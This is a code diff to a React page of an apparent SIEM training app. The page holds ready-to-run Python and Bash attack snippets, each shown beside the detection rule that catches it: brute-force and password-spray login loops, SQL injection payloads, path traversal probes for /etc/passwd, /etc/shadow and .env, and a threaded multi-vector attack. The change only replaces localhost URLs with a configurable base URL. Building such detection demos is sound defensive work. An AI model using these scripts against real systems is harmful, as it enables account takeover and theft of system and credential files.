@@ -2,7 +2,7 @@ import { useState } from "react";
 import axios from "axios";
 import { Link } from "react-router-dom";
 import { TerminalIcon, TrashIcon, CheckIcon, AlertIcon, LogIcon, CopyIcon } from "../components/Icons";
-import { getApiUrl } from "../config/api";
+import { API_BASE_URL, getApiUrl } from "../config/api";
 
 const ATTACK_CODE_SNIPPETS = {
   brute_force: {
@@ -10,7 +10,7 @@ const ATTACK_CODE_SNIPPETS = {
     description: "Rapid credential guessing loop targeting a single user within a 60-second sliding window.",
     python: `import requests, time
 
-TARGET_URL = "http://localhost:5000/api/auth/login"
+TARGET_URL = "${API_BASE_URL}/api/auth/login"
 TARGET_USER = "admin@secureshare.local"
 WORDLIST = [
     "123456", "password", "welcome1", "admin123", 
@@ -27,7 +27,7 @@ for pwd in WORDLIST:
     time.sleep(1.0) # > 5 attempts in < 60s triggers BRUTE_FORCE_ATTACK`,
     bash: `# Direct Bash loop simulation:
 for pass in 123456 password welcome1 admin123 letmein toor pass123 Admin123; do
-  curl -s -X POST http://localhost:5000/api/auth/login \\
+  curl -s -X POST ${API_BASE_URL}/api/auth/login \\
     -H 'Content-Type: application/json' \\
     -d "{\\"email\\":\\"admin@secureshare.local\\",\\"password\\":\\"\${pass}\\"}"
   echo "[-] Tested password: \${pass}"
@@ -43,7 +43,7 @@ Action: Flag CRITICAL incident & generate automated iptables DROP rule.`,
     description: "Injects URL-encoded SQL syntax and boolean bypass payloads into authentication and search routes.",
     python: `import requests
 
-TARGET_URL = "http://localhost:5000/api/auth/login"
+TARGET_URL = "${API_BASE_URL}/api/auth/login"
 SQLI_PAYLOADS = [
     "' OR '1'='1",
     "admin' --",
@@ -61,7 +61,7 @@ for payload in SQLI_PAYLOADS:
     print(f"[!] Tested SQLi payload: {payload} -> HTTP {res.status_code}")`,
     bash: `# Direct Bash SQL Injection probe:
 for payload in "' OR '1'='1" "admin' --" "admin' /*" "1' UNION SELECT null, username, password FROM users --"; do
-  curl -s -X POST http://localhost:5000/api/auth/login \\
+  curl -s -X POST ${API_BASE_URL}/api/auth/login \\
     -H 'Content-Type: application/json' \\
     -d "{\\"email\\":\\"\${payload}\\",\\"password\\":\\"dummy\\"}"
   echo "[-] Injected payload: \${payload}"
@@ -76,7 +76,7 @@ Action: Flag HIGH incident & advise parameterized queries / prepared statements.
     description: "Sprays passwords across multiple distinct usernames from a single originating IP address.",
     python: `import requests, time
 
-TARGET_URL = "http://localhost:5000/api/auth/login"
+TARGET_URL = "${API_BASE_URL}/api/auth/login"
 USER_SPRAY_LIST = [
     "root", "admin", "administrator", "ahmed", 
     "anuraj", "shahz", "anfas", "operator"
@@ -93,7 +93,7 @@ for user in USER_SPRAY_LIST:
     time.sleep(2.0) # > 3 distinct usernames in < 120s triggers CREDENTIAL_STUFFING`,
     bash: `# Multi-user curl spray loop:
 for user in root admin administrator ahmed anuraj shahz anfas; do
-  curl -s -X POST http://localhost:5000/api/auth/login \\
+  curl -s -X POST ${API_BASE_URL}/api/auth/login \\
     -H 'Content-Type: application/json' \\
     -d "{\\"email\\":\\"\${user}@secureshare.local\\",\\"password\\":\\"SprayPass123\\"}"
   echo "[-] Sprayed account: \${user}"
@@ -109,7 +109,7 @@ Action: Flag HIGH incident & enforce CAPTCHA rate-limiting on /api/auth/login.`,
     description: "Probes filesystem boundaries using relative path climbing tokens (../ and ..\\).",
     python: `import requests
 
-BASE_URL = "http://localhost:8001/api/files/download"
+BASE_URL = "${API_BASE_URL}/api/files/download"
 TRAVERSAL_VECTORS = [
     "../../../../etc/passwd",
     "..%2f..%2f..%2fetc%2fshadow",
@@ -125,7 +125,7 @@ for path in TRAVERSAL_VECTORS:
     print(f"[!] Path Probe: {path} -> HTTP {res.status_code}")`,
     bash: `# Directory Traversal curl verification:
 for path in "../../../../etc/passwd" "..%2f..%2f..%2fetc%2fshadow" "../../../../.env"; do
-  curl -s -i "http://localhost:8001/api/files/download?path=\${path}"
+  curl -s -i "${API_BASE_URL}/api/files/download?path=\${path}"
   echo "[-] Probed path: \${path}"
 done`,
     detectionRule: `Rule: PATH_TRAVERSAL
@@ -140,16 +140,16 @@ Action: Flag HIGH incident & enforce strict path normalization and chroot isolat
 
 def brute_force_worker():
     for pwd in ["123", "pass", "admin", "wrong", "fail", "test"]:
-        requests.post("http://localhost:5000/api/auth/login", json={"email": "admin", "password": pwd})
+        requests.post("${API_BASE_URL}/api/auth/login", json={"email": "admin", "password": pwd})
         time.sleep(0.5)
 
 def sqli_worker():
     for payload in ["' OR 1=1--", "UNION SELECT password FROM users"]:
-        requests.post("http://localhost:5000/api/auth/login", json={"email": payload, "password": "123"})
+        requests.post("${API_BASE_URL}/api/auth/login", json={"email": payload, "password": "123"})
 
 def traversal_worker():
     for p in ["../../etc/passwd", "../.env"]:
-        requests.get(f"http://localhost:8001/api/files/download?path={p}")
+        requests.get(f"${API_BASE_URL}/api/files/download?path={p}")
 
 # Launch multi-vector attack threads concurrently
 threads = [
@@ -162,7 +162,7 @@ for t in threads: t.start()
 for t in threads: t.join()
 print("[+] Multi-vector attack campaign executed successfully.")`,
     bash: `# Multi-Vector simulation trigger via SIEM API:
-curl -X POST http://localhost:5001/api/simulate \\
+curl -X POST ${API_BASE_URL}/api/simulate \\
   -H 'Content-Type: application/json' \\
   -d '{"attack_type": "all"}'`,
     detectionRule: `SIEM Multi-Vector Aggregator:
